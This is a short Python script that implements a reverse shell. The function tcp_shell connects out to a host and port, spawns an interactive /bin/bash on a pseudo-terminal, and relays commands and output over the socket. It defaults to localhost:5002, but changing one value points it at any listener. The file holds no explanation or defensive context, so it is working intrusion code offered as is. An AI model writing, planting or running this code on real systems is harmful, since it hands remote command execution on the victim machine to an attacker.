def tcp_shell(HOST="127.0.0.1", PORT=5002):
    import socket
    import os
    import pty
    import select

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        s.setblocking(0)  # Set to non-blocking

        # pty.spawn() handles duplicating file descriptors, so we don't need to do it manually

        # Use /bin/bash as the shell and pass the -i flag for an interactive shell
        pid, fd = pty.fork()
        if pid == 0:
            # Child process
            os.environ['TERM'] = 'xterm'  # Set a basic terminal type
            os.execle('/bin/bash', '/bin/bash', '-i', {k: v for k, v in os.environ.items()})
        else:
            # Parent process
            while True:
                rlist, _, _ = select.select([s, fd], [], [])

                if s in rlist:
                    try:
                        data = s.recv(1024)
                        if not data:
                            break
                        os.write(fd, data)
                    except Exception as e:  # Catch broader exception
                        print(f"Error receiving from server: {e}")
                        break

                if fd in rlist:
                    try:
                        data = os.read(fd, 1024)
                        if not data:
                            break
                        s.send(data)
                    except Exception as e:  # Catch broader exception
                        print(f"Error receiving from shell: {e}")
                        break

    except Exception as e:
        print(f"Error in tcp_shell: {e}")
    finally:
        s.close()
        print("Connection closed. Exiting.")

if __name__ == "__main__":
    HOST = "127.0.0.1"
    PORT = 5002
    tcp_shell()